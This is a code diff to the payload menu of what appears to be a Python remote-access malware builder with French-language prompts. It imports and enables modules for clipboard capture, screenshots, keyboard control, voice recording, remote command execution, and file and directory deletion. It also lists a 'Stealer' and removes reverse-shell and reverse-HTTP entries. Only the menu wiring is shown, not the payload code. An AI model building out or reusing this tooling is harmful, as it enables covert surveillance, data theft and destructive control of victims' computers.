@@ -4,13 +4,11 @@ from Option.modules.payload.clipboard import clipboard_module
 from Option.modules.payload.screenshot import screenshot_module
 from Option.modules.payload.dirlist import *
 #from Option.modules.payload.filegrab import file_grabber_module
-#from Option.modules.payload.keybcontrol import keyboard_controller_module
+from Option.modules.payload.keybcontrol import *
 from Option.modules.payload.networkinfo import *
-from Option.modules.payload.openurl import *#eva
+from Option.modules.payload.openurl import *
 #from Option.modules.payload.porthammer import port_hammer_module
 #from Option.modules.payload.processview import process_view_module
-#from Option.modules.payload.reversehttp import reverse_http_module
-#from Option.modules.payload.reverseshell import reverse_shell_module
 from Option.modules.payload.rmdir import *
 from Option.modules.payload.rmscript import *
 from Option.modules.payload.runcmd import *
@@ -64,21 +62,19 @@ Appuyez sur Entrée pour continuer...
         ("Screenshot", screenshot_module),
         ("Directory listing", directory_listing_module),
         ("File Grabber", None),
-        ("Keyboard controller", None),
-        ("Network info", None),
+        ("Keyboard controller", keybcontrol),
+        ("Network info", networkinfo),
         ("Open url", open_url_module),
         ("Port Hammer", None),
         ("Process View", None),
         ("Restart PC", None),
-        ("Reverse HTTP", None),
-        ("Reverse Shell", None),
         ("Remove Directory", rmdir_module),
         ("Remove file", rmscript),
         ("Run Command on terminal", runcmd_module),
         ("Shutdown", shutdown_module),
         ("Stealer", None),
-        ("Voice record", None),
-        ("Change wallpaper", ),
+        ("Voice record", voicerec),
+        ("Change wallpaper", wallpaper),
     ]
 
     captures = [
@@ -114,13 +110,11 @@ Appuyez sur Entrée pour continuer...
         2. Screenshot
         3. Directory listing
         4. File Grabber (en développement)
-        5. keyboard controller (en développement)
-        6. Network info (en développement)
+        5. keyboard controller
+        6. Network info
         7. Open url
         8. Port Hammer (en développement)
         9. Process View (en développement)  
-        11. Reverse HTTP (en développement)
-        12. Reverse Shell (en développement)
         13. Remove Directory
         14. Remove file 
         15. Run Command on terminal
